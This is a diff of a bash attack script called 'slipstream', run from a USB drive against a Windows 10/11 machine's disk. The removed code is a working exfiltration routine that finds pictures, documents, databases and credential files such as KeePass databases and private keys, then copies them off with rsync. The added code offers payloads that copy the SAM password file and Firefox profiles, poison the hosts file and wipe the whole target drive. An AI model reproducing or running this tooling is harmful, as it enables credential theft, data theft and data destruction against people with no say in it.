@@ -1,11 +1,12 @@
 #!/usr/bin/env bash
 
 # slipstream
-# Automatic Exfil Script
+# Automated Payload Injector for Win10/11
 # Best when combined with buildroot on a USB drive
 ####################################################################
 # Usage: ./slipstream.sh
 # Depends on [root,rsync,coreutils,lsblk,parted,bash,awk,grep]
+# Currently only supports Windows 10/11 Target Partition Detection
 ####################################################################
 # Copyright 2025 nullcollective
 #
@@ -20,27 +21,26 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
+#clear -x
 
-# Currently only supports Windows 10/11 Target Partition Detection
-clear -x
+# Source Functions
+SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
+source ${SCRIPT_DIR}/slipstream_functions.sh
+source ${SCRIPT_DIR}/slipstream_payload_functions.sh
 
 #-------------------
 # USER VARIABLES
 #--------------------
 
-# DRIVE INFO
-# Used to detect USB data drive
-# Add Label to partition
+#---- DRIVE INFO ----#
+# Drive Label of Destination USB Drive
 USB_LABEL="data"
 # Where to mount your target's drive to
-TARGET_MOUNT="/mnt/win"
+TARGET_MOUNT="/mnt/target"
 # Where to mount your USB data drive to
-USB_MOUNT="/mnt/exfil"
+USB_MOUNT="/mnt/slipstream"
 
-USB_DISK="" # LEAVE BLANK
-TARGET_DISK="" # LEAVE BLANK
-
-# EXFIL OPTIONS
+#---- EXFIL OPTIONS ----#
 # Which find pattern(s) to use
 SEARCH="PICS DOCS"
 # How far recursive search should decend
@@ -50,106 +50,88 @@ BASE_SEARCH_PATH="/Users"
 # Poweroff After Completion
 poweroff_device="false"
 
-# EXFIL PATTERNS
-PICS='.*/.*\.(jpg|jpeg|png|gif)$'
-VIDS='.*/.*\.(mp4|mkv|mov)$'
-DOCS='.*/.*\.(doc|docx|pdf|txt|rtf|odt|tex)$'
-DB='.*/.*\.(xls|xlsx|ods|tsv|csv|db|sqlite|mdb|accdb)$'
-CREDS='.*/.*\.(kdb|kdbx|pem|key|cert|crt|ppk)$'
-ARCH='.*/.*\.(zip|tar|gz|tgz|xz|exe|7z|rar)$'
-SCRIPTS='.*/.*\.(sh|py|bat|ps1|js|pl)$'
-OTHER='.*/.*\.(bak|tmp|log)$'
+#---- HOSTFILE POISONING ----#
+poisoned_hosts=(
+	"0.0.0.0 google.com"
+	"0.0.0.0 facebook.com"
+)
+
 #-------------------------------------------------------
 # DO NOT EDIT BELOW UNLESS YOU NEED TO ADJUST THE CODE
 #-------------------------------------------------------
-
-echo -e "+++ slipstream by nullcollective +++\n"
+echo -e "[: :|:::] slipstream by nullcollective [: :|:::]"
+echo -e "╭∩╮(ô¿ô)╭∩╮ FUCK MAGA ╭∩╮(ô¿ô)╭∩╮\n"
+echo -e "-------------------------------------------"
+echo "TARGET MOUNT: ${TARGET_MOUNT}"
+echo "USB MOUNT: ${USB_MOUNT}"
+echo "Poweroff After Running: $poweroff_device"
+echo -e "-------------------------------------------\n"
 
 # VERIFY ELEVATED PRIVS / REQUIRED FOR MOUNTING DRIVES
-if [[ "$UID" -ne 0 ]]; then
-	echo "THIS SCRIPT MUST BE RUN AS UID 0" ; exit 1
-fi
-echo "[>] UID 0 CHECK PASSED"
+if [[ "$UID" -ne 0 ]];then echo "RUN AS UID 0";exit 1;fi
+if [ $# -eq 0 ];then usage;exit 1;fi
+# -------------------------------------------------
 
-#-------------------------------------------------------
-# INIT
-#-------------------------------------------------------
-mkdir -p "${TARGET_MOUNT}" 2>/dev/null
-mkdir -p "${USB_MOUNT}" 2>/dev/null
+function init_drive_setup {
+	init
+	drive_detection_target
+	drive_detection_usb
+	drive_mounting_target
+	drive_mounting_usb
+	echo "[>] DRIVES MOUNTED --> SRC=${TARGET_DISK}, DEST=${USB_DISK}"
+}
 
-# VERIFY PATHS
-for dir in $TARGET_MOUNT $USB_MOUNT;do
-	if [[ ! -d "${dir}" ]]; then
-		echo "DIRECTORY CREATION ISSUES" ; exit 1
-	fi
-done
-echo "[>] MOUNT PATHS CHECK PASSED"
+# Exfil Data Function
+function exfiltrate_data {
+	init_drive_setup
+	echo "[>] Exfiltrating file(s) from ${TARGET_MOUNT} to ${USB_MOUNT}"
+	payload_exfiltrate_data
+	drive_unmounting_usb
+	drive_unmounting_target
+}
 
-#-------------------------------------------------------
-# DRIVE DETECTION
-#-------------------------------------------------------
+# Copy SAM FILE Function
+function samcopy {
+	init_drive_setup
+	echo "[>] Copying SAM FILE from ${TARGET_MOUNT} to ${USB_MOUNT}"
+	payload_samcopy
+	drive_unmounting_usb
+	drive_unmounting_target
+}
 
-# DETECT WINDOWS PARTITION
-for disk in $(lsblk -dn -o NAME,TYPE | awk '$2 == "disk" { print "/dev/" $1 }');do
-	part=$(parted -m "${disk}" print | grep -i 'ntfs.*Basic data partition' | cut -d: -f1)
-	if [[ -n "$part" ]]; then
-		TARGET_DISK=$(echo "$disk"p"$part")
-		break
-	fi
-done
+# Copy Firefox Profiles
+function firefox_copy {
+	init_drive_setup
+	echo "[>] Copying Firefox Profiles from ${TARGET_MOUNT} to ${USB_MOUNT}"
+	payload_firefox_copy
+	drive_unmounting_usb
+	drive_unmounting_target
+}
 
-# DETECT EXFIL USB DRIVE
-usbpart=$(lsblk -m -o name,label --raw | awk -v label="$USB_LABEL" '$2 == label { print "/dev/" $1 }')
-if [[ -n "$usbpart" ]]; then
-	USB_DISK=$usbpart
-fi
+# Poison Target Host File
+function host_poison {
+	init
+	drive_detection_target
+	drive_mounting_target_rw
+	echo "[>] Poisoning Host File..."
+	payload_host_poison
+	drive_unmounting_target
+}
 
-# VALIDATE DEVICES
-if [[ -z "${TARGET_DISK}" ]]; then
-	echo "NO TARGET DRIVE CANDIDATES FOUND" ; exit 1
-fi
+# WIPE WINDOWS TARGET DRIVE
+function wipe_all_data {
+	init
+	drive_detection_target
+	drive_mounting_target_rw
+	payload_wipe_all_data
+	drive_unmounting_target
+}
 
-if [[ -z "${USB_DISK}" ]]; then
-        echo "NO USB EXFIL DRIVES FOUND" ; exit 1
-fi
-
-#-------------------------------------------------------
-# DRIVE MOUNTING
-#-------------------------------------------------------
-
-# MOUNT TARGET PARTITION (R/O)
-mount -o ro ${TARGET_DISK} ${TARGET_MOUNT} || { exit 1; }
-# MOUNT EXFIL USB PARTITION (R/W)
-# Fast Options Enabled for faster unmounting
-mount -o sync,noatime,nodiratime ${USB_DISK} ${USB_MOUNT} || { exit 1; }
-echo "[>] DRIVES MOUNTED"
-echo "[>] slipstreaming file(s) from ${TARGET_DISK} to ${USB_DISK}"
-echo "-------------------------------------------------"
-#-------------------------------------------------------
-# EXFIL PROCESSING
-#-------------------------------------------------------
-# FIND FILES BY PATTERN
-for filetype in ${SEARCH};do
-        pattern="${!filetype}"
-        find "${TARGET_MOUNT}${BASE_SEARCH_PATH}"/* \
-                               	-maxdepth ${SEARCH_DEPTH} \
-                                -type f \
-                                -regextype posix-extended \
-                                -regex ${pattern} | \
-                                while read -r foundfile; do
-					echo "[discovered] ${foundfile}"
-                                        rsync -Rah --protect-args --info=progress2 "${foundfile}" "${USB_MOUNT}/"
-        done
-done
-echo "-------------------------------------------------"
-# UNMOUNT USB AND TARGET PARTITIONS
-echo "[>] UMOUNTING DRIVES..."
-umount ${USB_MOUNT} ; echo "[>>>] USB UNMOUNTED"
-umount ${TARGET_MOUNT} ; echo "[>>>] TARGET DRIVE UNMOUNTED"
-echo "[>] COMPLETE"
+# -------------------------------------------------
+# MAIN PAYLOAD SELECTOR
+while getopts "hlx:" opt; do cmd_prompt ; done
+echo -e "-------------------------------------------\n"
 
 # SHUTDOWN SYSTEM (optional)
-if [ "${poweroff_device}" = "true" ]; then
-	poweroff
-fi
+if [ "${poweroff_device}" = "true" ]; then poweroff ; fi
 exit 0
